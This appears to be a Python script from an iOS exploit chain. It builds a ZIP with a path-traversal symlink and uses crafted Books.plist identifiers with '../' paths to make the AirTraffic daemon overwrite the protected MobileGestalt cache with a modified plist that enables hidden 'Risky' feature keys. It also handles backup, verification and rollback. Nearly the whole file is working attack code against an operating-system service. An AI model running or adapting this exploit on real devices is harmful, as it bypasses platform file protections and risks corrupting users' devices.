#!/usr/bin/env python3
"""Fail-closed, single-symlink AirTraffic MobileGestalt replacement.

The target leaf is never opened for write.  AirTraffic relocates one generated
directory link directly to the MobileGestalt cache directory, then coalesces
the live-cache export and full-cache import in one host-message-link drain.
Exact readback is performed by exporting the result to Media; a second
coalesced sequence moves any daemon-regenerated cache aside and reimports the
verified bytes.  Failure restores the exported live cache the same way.
"""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import subprocess
import sys
import time
import zipfile
from pathlib import Path
from typing import Any

import chain_canary as chain


ROOT = Path(__file__).resolve().parent
MOBILE = ROOT / "mobiledevice_io"
ATC = ROOT / "atc_sequence"
ATC_FAST = ROOT / "atc_coalesced_sequence"
RUN_ROOT = ROOT / "run" / "direct-mgcache-replace"
STATE_PATH = ROOT / "direct-mgcache-replace-state.json"
TARGET_DIRECTORY = (
    "/var/containers/Shared/SystemGroup/"
    "systemgroup.com.apple.mobilegestaltcache/Library/Caches"
)
TARGET_TAIL = TARGET_DIRECTORY[1:]
TARGET_LEAF = "com.apple.MobileGestalt.plist"
AIRLOCK_BOOK_ROOT = "/var/mobile/Media/Airlock/Book"
EXPECTED_ORIGINAL = (
    ROOT.parent
    / "atc-preferences-deputy-canary"
    / "run/c45d9dd12298ca2861d4/mobilegestalt-before-risky.plist"
)
EXPECTED_REPLACEMENT = (
    ROOT.parent
    / "atc-preferences-deputy-canary"
    / "run/c45d9dd12298ca2861d4/mobilegestalt-proposed-risky.plist"
)
RISKY_KEYS = (
    "mG0AnH/Vy1veoqoLRAIgTA",
    "UCG5MkVahJxG1YULbbd5Bg",
    "ZYqko/XM5zD3XBfN5RmaXA",
    "nVh/gwNpy7Jv1NOk00CMrw",
    "uKc7FPnEO++lVhHWHFlGbQ",
)


def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def run_json(command: list[str], timeout: int) -> dict[str, Any]:
    try:
        completed = subprocess.run(
            command,
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as error:
        return {
            "ok": False,
            "error": "host helper timeout",
            "timeoutSeconds": timeout,
            "stdoutTail": (error.stdout or "").splitlines()[-8:]
            if isinstance(error.stdout, str)
            else [],
        }
    value: dict[str, Any] | None = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            candidate = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(candidate, dict):
            value = candidate
            break
    if value is None:
        value = {"ok": False, "error": "no JSON helper result"}
    value["exitCode"] = completed.returncode
    if completed.stderr:
        value["stderrTail"] = completed.stderr.splitlines()[-8:]
    return value


def mobile(udid: str, command: str, *arguments: str) -> dict[str, Any]:
    return run_json([os.fspath(MOBILE), command, udid, *arguments], 70)


def atc(udid: str, pairs: list[tuple[str, str]]) -> dict[str, Any]:
    command = [os.fspath(ATC), udid]
    for identifier, destination in pairs:
        command.extend([identifier, destination])
    return run_json(command, min(180, 80 + len(pairs) * 8))


def operation_ok(result: dict[str, Any]) -> bool:
    return bool(result.get("targetGatePassed") and result.get("operation", {}).get("ok"))


def plist_bytes(path: Path) -> tuple[bytes, dict[str, Any]]:
    data = path.read_bytes()
    value = plistlib.loads(data)
    if (
        not isinstance(value, dict)
        or not data.startswith(b"bplist00")
        or not isinstance(value.get("CacheData"), bytes)
        or not isinstance(value.get("CacheExtra"), dict)
        or data == b""
        or len(data) > 1024 * 1024
    ):
        raise RuntimeError(f"cache safety gate rejected {path}")
    return data, value


def risky_nibble(cache_data: bytes) -> tuple[int, str]:
    import re

    text = cache_data.hex()
    start = 1616
    for match in re.finditer(r"0+(?:5555)*([0-9a-f]{4})", text[start : start + 200]):
        value_start = start + match.start(1)
        value = match.group(1)
        if sum(character != "0" for character in value) < 3:
            continue
        left = value_start - 67
        right = value_start + 13
        if left <= 0 or right + 1 >= len(text):
            continue
        valid = True
        for offset in (left, right):
            if (
                text[offset] not in ("1", "3")
                or text[offset - 1] != "0"
                or text[offset + 1] != "0"
            ):
                valid = False
                break
        if valid:
            return left, text[left]
    raise RuntimeError("Risky CacheData nibble was not found")


def validate_risky(value: dict[str, Any]) -> dict[str, Any]:
    extra = value.get("CacheExtra")
    offset, nibble = risky_nibble(value["CacheData"])
    enabled = bool(
        isinstance(extra, dict)
        and all(extra.get(key) == 1 for key in RISKY_KEYS)
        and nibble == "3"
    )
    return {
        "enabled": enabled,
        "cacheDataNibbleOffset": offset,
        "cacheDataNibble": nibble,
        "cacheExtraKeysEnabled": bool(
            isinstance(extra, dict) and all(extra.get(key) == 1 for key in RISKY_KEYS)
        ),
    }


def build_archive(payload: bytes) -> bytes:
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(chain.zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(chain.zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{TARGET_TAIL}".encode(),
        )
        cursor = ""
        for component in TARGET_TAIL.split("/"):
            cursor = f"{cursor}{component}/"
            archive.writestr(chain.zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(chain.zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def books(identifiers: list[str]) -> bytes:
    return plistlib.dumps(
        {
            "Books": [
                {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
                for index, identifier in enumerate(identifiers, 1)
            ]
        },
        fmt=plistlib.FMT_BINARY,
        sort_keys=True,
    )


def save(state: dict[str, Any]) -> None:
    STATE_PATH.write_text(json.dumps(state, indent=2, sort_keys=True) + "\n")


def stage_books(state: dict[str, Any], label: str, identifiers: list[str]) -> dict[str, Any]:
    path = Path(state["runDirectory"]) / f"Books-{label}.plist"
    data = books(identifiers)
    path.write_bytes(data)
    result = mobile(
        state["udid"],
        "stage-generated-mg-books",
        state["source"],
        state["outer"],
        os.fspath(path),
    )
    state.setdefault("booksStages", {})[label] = {
        "sha256": digest(data),
        "identifiers": identifiers,
        "transport": result,
    }
    save(state)
    if not operation_ok(result):
        raise RuntimeError(f"{label} Books staging failed")
    return result


def link_present(state: dict[str, Any]) -> dict[str, Any]:
    return mobile(
        state["udid"],
        "probe-nested-state",
        state["source"],
        state["outer"],
        state["backup"],
        state["verification"],
        state["pivotLeaf"],
    )


def move(
    state: dict[str, Any],
    label: str,
    pairs: list[tuple[str, str]],
    *,
    restage: bool = True,
) -> dict[str, Any]:
    if restage:
        stage_books(state, label, [identifier for identifier, _ in pairs])
    result = atc(state["udid"], pairs)
    state.setdefault("moves", {})[label] = result
    save(state)
    return result


def fast_move(
    state: dict[str, Any],
    label: str,
    first: tuple[str, str],
    second: tuple[str, str],
) -> dict[str, Any]:
    stage_books(state, label, [first[0], second[0]])
    gate = Path(state["runDirectory"]) / f"{label}.gate"
    ready = Path(f"{gate}.ready")
    gate.unlink(missing_ok=True)
    ready.unlink(missing_ok=True)
    gate.write_text("go\n")
    try:
        result = run_json(
            [
                os.fspath(ATC_FAST),
                state["udid"],
                first[0],
                first[1],
                second[0],
                second[1],
                os.fspath(gate),
            ],
            105,
        )
    finally:
        gate.unlink(missing_ok=True)
        ready.unlink(missing_ok=True)
    state.setdefault("fastMoves", {})[label] = result
    save(state)
    return result


def verify_export(state: dict[str, Any], name: str, expected: Path) -> dict[str, Any]:
    return mobile(
        state["udid"], "verify-generated-mg-export", name, os.fspath(expected)
    )


def copy_export(state: dict[str, Any], name: str, destination: Path) -> dict[str, Any]:
    temporary = Path("/tmp") / f"codex-mgcache-read-24A435-{state['token']}.plist"
    temporary.unlink(missing_ok=True)
    try:
        result = mobile(
            state["udid"],
            "copy-generated-mg-export",
            name,
            os.fspath(temporary),
        )
        if operation_ok(result) and temporary.is_file():
            destination.write_bytes(temporary.read_bytes())
            result["savedPath"] = os.fspath(destination)
            result["savedSHA256"] = digest(destination.read_bytes())
        return result
    finally:
        temporary.unlink(missing_ok=True)


def probe_target(state: dict[str, Any]) -> dict[str, Any]:
    return mobile(state["udid"], "probe-generated-mgcache", state["outer"])


def remove_export(state: dict[str, Any], name: str) -> dict[str, Any]:
    return mobile(state["udid"], "remove-generated-mg-export", name)


def remove_alias(state: dict[str, Any]) -> dict[str, Any]:
    return mobile(
        state["udid"],
        "remove-generated-mgcache-hardlink",
        state["outer"],
        state["alias"],
    )


def verify_in_place(state: dict[str, Any], expected: Path, label: str) -> dict[str, Any]:
    remove_alias(state)
    created = mobile(
        state["udid"],
        "create-generated-mgcache-hardlink",
        state["outer"],
        state["alias"],
    )
    verified = verify_export(state, state["alias"], expected)
    removed = remove_alias(state)
    result = {"create": created, "verify": verified, "remove": removed}
    state.setdefault("inPlaceChecks", {})[label] = result
    save(state)
    result["ok"] = bool(
        operation_ok(created) and operation_ok(verified) and operation_ok(removed)
    )
    return result


def verify_and_reassert(
    state: dict[str, Any], expected: Path, label: str, export_name: str
) -> dict[str, Any]:
    expected_data, _ = plist_bytes(expected)
    report: dict[str, Any] = {
        "exportName": export_name,
        "expectedLength": len(expected_data),
        "expectedSHA256": digest(expected_data),
    }
    before = verify_export(state, export_name, expected)
    report["exportBefore"] = before
    if before.get("operation", {}).get("observedPresent") and not operation_ok(before):
        report["removeWrongExport"] = remove_export(state, export_name)
        before = verify_export(state, export_name, expected)
    if not before.get("operation", {}).get("observedPresent"):
        report["export"] = move(
            state,
            f"{label}-export",
            [(state["targetIdentifier"], export_name)],
        )
    exact = verify_export(state, export_name, expected)
    report["exactExport"] = exact
    if not operation_ok(exact):
        report["ok"] = False
        return report
    report["discardCleanup"] = remove_export(state, state["discard"])
    export_identifier = posixpath.relpath(
        f"/var/mobile/Media/{export_name}", AIRLOCK_BOOK_ROOT
    )
    report["reimportIdentifier"] = export_identifier
    report["reassert"] = fast_move(
        state,
        f"{label}-reassert",
        (state["targetIdentifier"], state["discard"]),
        (export_identifier, f"{state['outer']}/{TARGET_LEAF}"),
    )
    probe = probe_target(state)
    report["targetAfterReassert"] = probe
    size = (
        probe.get("operation", {})
        .get("fileInfo", {})
        .get("values", {})
        .get("st_size")
    )
    export_after = verify_export(state, export_name, expected)
    report["exportAfterReassert"] = export_after
    report["discardRemoval"] = remove_export(state, state["discard"])
    report["ok"] = bool(
        operation_ok(probe)
        and str(size) == str(len(expected_data))
        and not export_after.get("operation", {}).get("observedPresent")
    )
    return report


def cleanup(state: dict[str, Any]) -> dict[str, Any]:
    remove_alias(state)
    state["discardCleanup"] = remove_export(state, state["discard"])
    result = mobile(
        state["udid"],
        "cleanup-generated-mg-replace",
        state["source"],
        state["outer"],
        state["backup"],
        state["verification"],
        TARGET_TAIL,
    )
    state["cleanup"] = result
    state["status"] = "clean" if operation_ok(result) else "cleanup-incomplete"
    save(state)
    return result


def rollback(state: dict[str, Any], original_path: Path) -> dict[str, Any]:
    report: dict[str, Any] = {"attempted": True, "verified": False}
    backup = verify_export(state, state["backup"], original_path)
    report["backup"] = backup
    if not operation_ok(backup):
        report["error"] = "exact live backup is unavailable"
        return report

    report["verificationRemoval"] = remove_export(state, state["verification"])
    report["discardRemoval"] = remove_export(state, state["discard"])
    report["restore"] = fast_move(
        state,
        "rollback-restore-original",
        (state["targetIdentifier"], state["discard"]),
        (state["backup"], f"{state['outer']}/{TARGET_LEAF}"),
    )
    report["roundTrip"] = verify_and_reassert(
        state, original_path, "rollback-original", state["backup"]
    )
    report["verified"] = report["roundTrip"].get("ok") is True
    return report


def run(original_path: Path, replacement_path: Path) -> dict[str, Any]:
    if STATE_PATH.exists():
        prior = json.loads(STATE_PATH.read_text())
        if prior.get("status") == "clean" and operation_ok(prior.get("cleanup", {})):
            archive = Path(prior["runDirectory"]) / "aborted-clean-state.json"
            archive.write_text(json.dumps(prior, indent=2, sort_keys=True) + "\n")
            STATE_PATH.unlink()
        else:
            raise RuntimeError(f"unfinished state exists: {STATE_PATH}")
    original, original_plist = plist_bytes(original_path)
    replacement, replacement_plist = plist_bytes(replacement_path)
    risky = validate_risky(replacement_plist)
    if not risky["enabled"] or original == replacement:
        raise RuntimeError("replacement Risky gate rejected")

    preflight_udid = chain.TRANSPORT.paired_coredevice_udid()
    preflight = mobile(preflight_udid, "probe-afc")
    if not operation_ok(preflight) or preflight["operation"].get("booksSyncPlistPresent"):
        raise RuntimeError("device/build/Books preflight failed")

    token = secrets.token_hex(10)
    run_dir = RUN_ROOT / token
    run_dir.mkdir(parents=True, exist_ok=False)
    source = f"codex-dir-src-24A435-{token}"
    outer = f"codex-dir-link-24A435-{token}"
    backup = f"codex-dir-recovered-24A435-original-{token}"
    verification = f"codex-dir-recovered-24A435-verify-{token}"
    discard = f"codex-dir-recovered-24A435-discard-{token}"
    alias = f"codex-mgcache-hardlink-24A435-{token}.plist"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    payload_identifier = f"../../{source}/payload"
    target_identifier = posixpath.relpath(
        f"{TARGET_DIRECTORY}/{TARGET_LEAF}", AIRLOCK_BOOK_ROOT
    )
    archive = build_archive(replacement)
    initial_books = books([link_identifier])
    archive_path = run_dir / "payload.zip"
    books_path = run_dir / "Books-initial.plist"
    archive_path.write_bytes(archive)
    books_path.write_bytes(initial_books)

    state: dict[str, Any] = {
        "schema": 1,
        "test": "DirectAirTrafficMobileGestaltFullCacheReplace",
        "status": "local-artifacts-ready",
        "udid": preflight_udid,
        "token": token,
        "runDirectory": os.fspath(run_dir),
        "source": source,
        "outer": outer,
        "backup": backup,
        "verification": verification,
        "discard": discard,
        "alias": alias,
        "pivotLeaf": f"codex-dir-pivot-24A435-{token}",
        "linkIdentifier": link_identifier,
        "payloadIdentifier": payload_identifier,
        "targetIdentifier": target_identifier,
        "target": f"{TARGET_DIRECTORY}/{TARGET_LEAF}",
        "originalPath": os.fspath(original_path),
        "replacementPath": os.fspath(replacement_path),
        "originalLength": len(original),
        "replacementLength": len(replacement),
        "originalSHA256": digest(original),
        "replacementSHA256": digest(replacement),
        "riskyValidation": risky,
        "preflight": preflight,
        "archiveSHA256": digest(archive),
        "canonicalMutationAttempted": False,
        "commitVerified": False,
        "rollbackVerified": False,
    }
    save(state)

    staged = mobile(
        state["udid"],
        "stage",
        source,
        outer,
        backup,
        os.fspath(archive_path),
        os.fspath(books_path),
    )
    state["stage"] = staged
    state["status"] = "staged" if operation_ok(staged) else "staging-failed"
    save(state)
    if not operation_ok(staged):
        raise RuntimeError("StreamingZip staging failed before target access")

    placement_attempts = [
        move(
            state,
            "place-direct-link",
            [(link_identifier, outer)],
            restage=False,
        )
    ]
    probe = link_present(state)
    if not probe.get("operation", {}).get("linkPresent"):
        placement_attempts.append(
            move(
                state,
                "place-direct-link-retry",
                [(link_identifier, outer)],
                restage=False,
            )
        )
        probe = link_present(state)
    state["placementAttempts"] = placement_attempts
    state["placementProbe"] = probe
    if not probe.get("operation", {}).get("linkPresent"):
        cleanup(state)
        raise RuntimeError("direct MobileGestalt directory link placement failed")
    state["status"] = "direct-link-placed"
    save(state)

    before = probe_target(state)
    state["beforeMetadata"] = before
    save(state)
    before_size = (
        before.get("operation", {})
        .get("fileInfo", {})
        .get("values", {})
        .get("st_size")
    )
    if not operation_ok(before) or str(before_size) != str(len(original)):
        cleanup(state)
        raise RuntimeError("live cache metadata preflight failed")

    failure: Exception | None = None
    try:
        state["canonicalMutationAttempted"] = True
        state["status"] = "fast-commit"
        save(state)
        commit_attempts = [
            fast_move(
                state,
                "fast-commit",
                (target_identifier, backup),
                (payload_identifier, f"{outer}/{TARGET_LEAF}"),
            )
        ]
        live_original_path = run_dir / "live-original.plist"
        backup_copy = copy_export(state, backup, live_original_path)
        if not operation_ok(backup_copy):
            target_after_attempt = probe_target(state)
            state["targetAfterFirstCommitAttempt"] = target_after_attempt
            target_size = (
                target_after_attempt.get("operation", {})
                .get("fileInfo", {})
                .get("values", {})
                .get("st_size")
            )
            if operation_ok(target_after_attempt) and str(target_size) == str(len(original)):
                commit_attempts.append(
                    fast_move(
                        state,
                        "fast-commit-retry",
                        (target_identifier, backup),
                        (payload_identifier, f"{outer}/{TARGET_LEAF}"),
                    )
                )
                backup_copy = copy_export(state, backup, live_original_path)
        state["commitAttempts"] = commit_attempts
        state["backupCopy"] = backup_copy
        if not operation_ok(backup_copy) or not live_original_path.is_file():
            raise RuntimeError("fast commit did not preserve a readable live-cache backup")

        live_original, live_original_plist = plist_bytes(live_original_path)
        state["liveOriginalLength"] = len(live_original)
        state["liveOriginalSHA256"] = digest(live_original)
        state["liveOriginalModel"] = live_original_plist.get("CacheExtra", {}).get(
            "0+nc/Udy4WNG8S+Q7a/s1A"
        )
        backup_check = verify_export(state, backup, live_original_path)
        state["backupCheck"] = backup_check
        save(state)
        if not operation_ok(backup_check):
            raise RuntimeError("exported live cache did not match the exact original")
        if live_original != original:
            raise RuntimeError(
                "live cache changed since the prepared Risky transformation"
            )

        state["status"] = "verifying-fast-commit"
        save(state)
        after = verify_and_reassert(
            state,
            replacement_path,
            "verify-fast-commit",
            verification,
        )
        state["finalReadback"] = after
        state["commitVerified"] = after["ok"]
        save(state)
        if not after["ok"]:
            raise RuntimeError("installed cache did not match replacement bytes")

        state["status"] = "commit-verified"
        save(state)
    except Exception as error:
        failure = error
        state["commitError"] = f"{type(error).__name__}: {error}"
        state["status"] = "rolling-back"
        save(state)
        rollback_source = Path(state["runDirectory"]) / "live-original.plist"
        rollback_result = rollback(
            state,
            rollback_source if rollback_source.is_file() else original_path,
        )
        state["rollback"] = rollback_result
        state["rollbackVerified"] = rollback_result.get("verified") is True
        state["status"] = (
            "rollback-verified" if state["rollbackVerified"] else "rollback-incomplete"
        )
        save(state)

    if failure is None or state.get("rollbackVerified"):
        cleanup_result = cleanup(state)
    else:
        cleanup_result = {"ok": False, "preserved": "rollback was not verified"}
        state["cleanup"] = cleanup_result
        save(state)

    report_path = run_dir / "direct-airtraffic-mgcache-replace.json"
    report_path.write_text(json.dumps(state, indent=2, sort_keys=True) + "\n")
    if operation_ok(cleanup_result):
        STATE_PATH.unlink(missing_ok=True)

    if failure is not None:
        raise RuntimeError(
            f"{failure}; rollbackVerified={state.get('rollbackVerified')}; "
            f"report={report_path}"
        )
    if not operation_ok(cleanup_result):
        raise RuntimeError(f"commit verified but cleanup incomplete: {report_path}")
    return {
        "ok": True,
        "commitVerified": True,
        "target": state["target"],
        "originalSHA256": state["originalSHA256"],
        "replacementSHA256": state["replacementSHA256"],
        "replacementLength": state["replacementLength"],
        "riskyValidation": state["riskyValidation"],
        "cleanupVerified": True,
        "report": os.fspath(report_path),
    }


def recover_preserved() -> dict[str, Any]:
    if not STATE_PATH.is_file():
        raise RuntimeError("no preserved direct-replacement state")
    state = json.loads(STATE_PATH.read_text())
    if state.get("status") not in ("rollback-incomplete", "rollback-verified"):
        raise RuntimeError(f"state is not a recovery state: {state.get('status')}")
    original_path = Path(state["runDirectory"]) / "live-original.plist"
    plist_bytes(original_path)
    report: dict[str, Any] = {
        "action": "verify-regenerated-original-and-clean",
        "verificationRemoval": remove_export(state, state["verification"]),
        "discardRemoval": remove_export(state, state["discard"]),
    }
    report["currentExport"] = move(
        state,
        "recovery-current-original-export",
        [(state["targetIdentifier"], state["verification"])],
    )
    report["currentExact"] = verify_export(
        state, state["verification"], original_path
    )
    if not operation_ok(report["currentExact"]):
        state["recoveryAudit"] = report
        save(state)
        raise RuntimeError("current canonical export is not the exact original")

    final_probe: dict[str, Any] = {}
    expected_length = len(original_path.read_bytes())
    for _ in range(15):
        final_probe = probe_target(state)
        size = (
            final_probe.get("operation", {})
            .get("fileInfo", {})
            .get("values", {})
            .get("st_size")
        )
        if operation_ok(final_probe) and str(size) == str(expected_length):
            break
        time.sleep(0.2)
    report["regeneratedTarget"] = final_probe
    size = (
        final_probe.get("operation", {})
        .get("fileInfo", {})
        .get("values", {})
        .get("st_size")
    )
    if not operation_ok(final_probe) or str(size) != str(expected_length):
        report["forcedRestore"] = fast_move(
            state,
            "recovery-forced-original-restore",
            (state["targetIdentifier"], state["discard"]),
            (state["backup"], f"{state['outer']}/{TARGET_LEAF}"),
        )
        final_probe = probe_target(state)
        report["targetAfterForcedRestore"] = final_probe
        size = (
            final_probe.get("operation", {})
            .get("fileInfo", {})
            .get("values", {})
            .get("st_size")
        )
    final_ok = bool(operation_ok(final_probe) and str(size) == str(expected_length))
    report["finalOriginalVerified"] = final_ok
    state["recoveryAudit"] = report
    state["rollbackVerified"] = final_ok
    state["status"] = "rollback-verified" if final_ok else "rollback-incomplete"
    save(state)
    if not final_ok:
        raise RuntimeError("canonical original did not reappear after exact export")
    cleanup_result = cleanup(state)
    report_path = Path(state["runDirectory"]) / "recovery-audit.json"
    report_path.write_text(json.dumps(state, indent=2, sort_keys=True) + "\n")
    if operation_ok(cleanup_result):
        STATE_PATH.unlink(missing_ok=True)
    else:
        raise RuntimeError("original verified but generated cleanup failed")
    return {
        "ok": True,
        "rollbackVerified": True,
        "originalSHA256": digest(original_path.read_bytes()),
        "cleanupVerified": True,
        "report": os.fspath(report_path),
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--recover", action="store_true")
    parser.add_argument("--original", type=Path, default=EXPECTED_ORIGINAL)
    parser.add_argument("--replacement", type=Path, default=EXPECTED_REPLACEMENT)
    args = parser.parse_args()
    try:
        result = recover_preserved() if args.recover else run(
            args.original, args.replacement
        )
        print(json.dumps(result, indent=2, sort_keys=True))
        return 0
    except Exception as error:
        print(
            json.dumps(
                {"ok": False, "error": f"{type(error).__name__}: {error}"},
                indent=2,
                sort_keys=True,
            )
        )
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
